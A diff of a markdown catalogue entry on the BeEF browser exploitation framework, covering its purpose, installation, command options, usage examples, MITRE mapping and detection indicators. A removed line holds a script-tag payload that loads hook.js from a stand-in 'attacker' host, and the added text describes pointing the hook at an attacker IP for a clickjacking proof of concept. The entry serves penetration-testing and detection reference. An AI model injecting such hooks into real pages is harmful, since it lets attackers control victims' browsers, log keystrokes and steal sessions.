@@ -1,18 +1,16 @@
 ---
-id: tool-uuid-001
 url: 'https://beefproject.com/'
 tags:
+  - beef
   - browser-exploitation
-  - xss
-  - hooking
+  - web
 type: tool
 verified: false
 platforms:
-  - Linux
-  - Windows
   - Web
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:15:30.772Z'
+updated_at: '2025-12-14T17:28:12.955Z'
+id: c6448ad3-38bd-4deb-a137-d8af43c11fb8
 validated: true
 submitted: true
 ---
@@ -22,24 +20,24 @@ submitted: true
 
 ## Overview
 
-BeEF (Browser Exploitation Framework) is an open-source tool for exploiting XSS vulnerabilities by hooking browsers and performing advanced attacks like session hijacking, phishing, and keylogging.
+BeEF (Browser Exploitation Framework) is an open-source tool for exploiting web browser vulnerabilities, primarily used to hook and control victim browsers after initial compromise like clickjacking, enabling actions such as keylogging, phishing, or network reconnaissance.
 
 ## Description
 
-BeEF allows attackers to control compromised browsers via injected JavaScript hooks. In offensive security, it's used post-XSS to expand access, such as stealing cookies or redirecting users. Features include a web UI for managing hooked zombies and modules for various exploits.
+BeEF operates by injecting a JavaScript hook into the victim's browser, allowing the attacker to send commands via a web interface. In clickjacking scenarios, it's integrated into the POC to gain persistent control post-click, facilitating data exfiltration or further attacks. It's commonly used in penetration testing for demonstrating browser-based risks.
 
 ## Features
 
-- Feature 1: Browser hooking via JS injection
-- Feature 2: Modular attacks (e.g., social engineering, network reconnaissance)
-- Feature 3: Real-time command execution on hooked browsers
+- Feature 1: Browser hooking via JavaScript injection
+- Feature 2: Command modules for keystroke capture, plugin enumeration, and social engineering
+- Feature 3: RESTful API for automation and integration with other tools
 
 ## Installation
 
 ### Requirements
 
-- Ruby environment
-- Git
+- Ruby (2.7+)
+- Bundler
 - Node.js for some modules
 
 ### Install Commands
@@ -48,16 +46,18 @@ BeEF allows attackers to control compromised browsers via injected JavaScript ho
 # Clone repository
 git clone https://github.com/beefproject/beef.git
 
-# Navigate and install
+# Install dependencies
 cd beef
 bundle install
+
+# Start BeEF
+./beef
 ```
 
 ## Basic Usage
 
 ```bash
-tool-name --help
-./beef
+./beef -h
 ```
 
 ### Common Options
@@ -65,25 +65,26 @@ tool-name --help
 | Option | Description |
 |--------|-------------|
 | `-h, --help` | Show help message |
-| `-v, --verbose` | Verbose output |
+| `-x` | Enable XSS extensions |
+| `-P PORT` | Specify hook port |
 
 ## Examples
 
 ### Example 1: Basic Usage
 
 ```bash
-./beef -p 3000
+./beef
 ```
 
-Open http://localhost:3000/ui/panel to access dashboard.
+> Starts the framework on http://localhost:3000/ui/panel. Access hooked browsers via the web UI.
 
 ### Example 2: Advanced Usage
 
 ```bash
-./beef --use-https
+./beef -P 8080
 ```
 
-Inject hook: <script src="http://attacker:3000/hook.js"></script>
+> Runs on custom port for integration with clickjacking POC by updating hook URL to http://attacker-ip:8080/hook.js.
 
 ## MITRE ATT&CK Mapping
 
@@ -103,9 +104,8 @@ This tool is commonly associated with:
 
 Indicators and methods for detecting this tool's usage:
 
-- Network traffic to unusual JS endpoints (e.g., /hook.js)
-- Anomalous browser behavior like unexpected redirects
-- CSP violations or console errors from hooked scripts
+- Detection method 1: Monitor for unusual JavaScript loads from external domains (e.g., hook.js)
+- Detection method 2: Browser console logs showing BeEF commands or network requests to attacker IPs
 
 ## Related Procedures
 
@@ -118,4 +118,4 @@ Indicators and methods for detecting this tool's usage:
 ## References
 
 - Official documentation: https://beefproject.com/
-- Related resources: OWASP XSS Prevention Cheat Sheet
+- Related resources: GitHub repository
